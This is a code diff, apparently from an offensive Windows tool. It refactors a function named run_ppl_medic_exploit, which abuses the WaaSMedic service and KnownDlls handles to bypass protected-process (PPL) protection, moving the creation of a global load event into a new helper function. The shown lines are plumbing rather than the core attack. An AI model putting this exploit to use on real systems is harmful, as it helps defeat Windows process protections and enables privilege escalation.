@@ -24,7 +24,6 @@ BOOL run_ppl_medic_exploit(
     LPWSTR     ProxyStubRegValuePath        = NULL;
     LPWSTR     ProxyStubOrigPath            = NULL;
     LPWSTR     WaaSMedicCapsulePath         = NULL;
-    LPWSTR     ProxyStubDllLoadEventName    = NULL;
     HANDLE     hTI                          = NULL;
     BOOL       StateRegTypeLibModified      = FALSE;
     BOOL       StateRegProxyStubModified    = FALSE;
@@ -179,19 +178,11 @@ BOOL run_ppl_medic_exploit(
     // for it to be signaled in a loop.
     //
 
-    ProxyStubDllLoadEventName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
-    if (!ProxyStubDllLoadEventName)
-    {
-        malloc_failed();
+    success = create_load_event(
+        STR_IPC_WAASMEDIC_LOAD_EVENT_NAME,
+        &ProxyStubDllLoadEventHandle);
+    if (!success)
         goto cleanup;
-    }
-    swprintf_s(ProxyStubDllLoadEventName, MAX_PATH, L"Global\\%ws", STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
-    ProxyStubDllLoadEventHandle = CreateEventW(NULL, TRUE, FALSE, ProxyStubDllLoadEventName);
-    if (!ProxyStubDllLoadEventHandle)
-    {
-        function_failed("CreateEventW");
-        goto cleanup;
-    }
 
     //
     // Here we start writing random handle values where the \KnownDlls hande is normally stored in
@@ -305,8 +296,6 @@ cleanup:
         NtClose(WaaSMedicCapsuleHandle);
     if (WaaSMedicCapsulePath)
         intFree(WaaSMedicCapsulePath);
-    if (ProxyStubDllLoadEventName)
-        intFree(ProxyStubDllLoadEventName);
     if (IWaaSRemediationEx)
         release_client(IWaaSRemediationEx);
     if (ProxyStubDllLoadEventHandle)
@@ -323,6 +312,38 @@ cleanup:
         intFree(TypeLibPath);
     if (is_service_running(STR_WAASMEDIC_SVC))
         stop_service_by_name(STR_WAASMEDIC_SVC, TRUE);
+
+    return ret_val;
+}
+
+BOOL create_load_event(
+    IN LPWSTR event_name,
+    OUT PHANDLE ProxyStubDllLoadEventHandle)
+{
+    BOOL   ret_val                   = FALSE;
+    LPWSTR ProxyStubDllLoadEventName = NULL;
+
+    ProxyStubDllLoadEventName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!ProxyStubDllLoadEventName)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    swprintf_s(ProxyStubDllLoadEventName, MAX_PATH, L"Global\\%ws", event_name);
+
+    *ProxyStubDllLoadEventHandle = CreateEventW(NULL, TRUE, FALSE, ProxyStubDllLoadEventName);
+    if (!*ProxyStubDllLoadEventHandle)
+    {
+        function_failed("CreateEventW");
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    if (ProxyStubDllLoadEventName)
+        intFree(ProxyStubDllLoadEventName);
 
     return ret_val;
 }
